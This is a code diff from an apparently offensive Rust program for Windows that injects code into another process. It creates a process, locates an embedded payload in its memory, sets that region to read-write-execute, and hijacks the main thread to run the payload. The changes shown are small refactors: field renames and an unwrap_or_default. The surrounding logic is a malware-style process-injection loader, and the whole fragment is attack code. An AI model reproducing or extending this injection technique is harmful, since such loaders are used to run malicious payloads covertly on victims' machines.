@@ -48,7 +48,7 @@ fn main() {
     let env: *const c_void = ptr::null();
     let curr_directory: PCSTR = PCSTR::null();
     let sa: Option<*const SECURITY_ATTRIBUTES> =
-        Some(&my_handle.security_attr as *const SECURITY_ATTRIBUTES);
+        Some(&my_handle.sa as *const SECURITY_ATTRIBUTES);
 
     let result = unsafe {
         CreateProcessA(
@@ -151,17 +151,14 @@ fn main() {
     let ns_handle: HANDLE = pi.hProcess;
     let result: Option<MemoryInfo> = find_offset(ns_handle, &buffer);
 
-    let mem_info: MemoryInfo = match result {
-        Some(mem_info) => mem_info,
-        None => MemoryInfo::default(),
-    };
+    let mem_info: MemoryInfo = result.unwrap_or_default();
 
     // change protection to RWX in the region that contain the payload
     change_protect(ns_handle, &mem_info);
 
     // try to hijack main thread
     let ns_thread: HANDLE = pi.hThread;
-    let offset: u64 = mem_info.offset as u64;
+    let offset: u64 = mem_info.payload_addr as u64;
     hijack_main_thread(ns_thread, offset);
 
     byte_written = 0;
